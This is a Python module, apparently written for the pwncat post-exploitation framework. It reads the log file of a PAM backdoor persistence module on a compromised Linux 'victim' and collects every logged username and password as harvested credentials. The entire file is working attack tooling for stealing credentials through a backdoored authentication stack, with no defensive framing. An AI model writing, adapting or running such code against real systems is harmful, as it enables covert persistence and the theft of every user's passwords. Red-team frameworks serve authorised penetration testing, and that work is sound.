#!/usr/bin/env python3

import pwncat
from pwncat.platform import Platform
from pwncat.modules.enumerate import EnumerateModule, Schedule
from pwncat.modules.enumerate.creds import PasswordData
from pwncat.modules.persist.gather import InstalledModule


class Module(EnumerateModule):
    """
    Exfiltrate logged passwords from the pam-based persistence
    module. This persistence module logs all attempted passwords
    for all users in a known location. We read this file and yield
    all passwords we have collected.
    """

    PLATFORM = Platform.LINUX
    SCHEDULE = Schedule.ALWAYS
    PROVIDES = ["creds.password"]

    def enumerate(self):

        pam: InstalledModule = None
        for module in pwncat.modules.run(
            "persist.gather", progress=self.progress, module="persist.pam_backdoor"
        ):
            pam = module

        if pam is None:
            # The pam persistence module isn't installed.
            return

        # Grab the log path
        log_path = pam.persist.args["log"]
        # Just in case we have multiple of the same password logged
        observed = []

        try:
            with pwncat.victim.open(log_path, "r") as filp:
                for lineno, line in enumerate(filp):
                    line = line.strip()
                    if line in observed:
                        continue

                    user, *password = line.split(":")
                    password = ":".join(password)

                    # Invalid user name
                    if user not in pwncat.victim.users:
                        continue

                    observed.append(line)

                    yield "creds.password", PasswordData(
                        password, log_path, lineno + 1, uid=pwncat.victim.users[user].id
                    )
        except (FileNotFoundError, PermissionError):
            pass
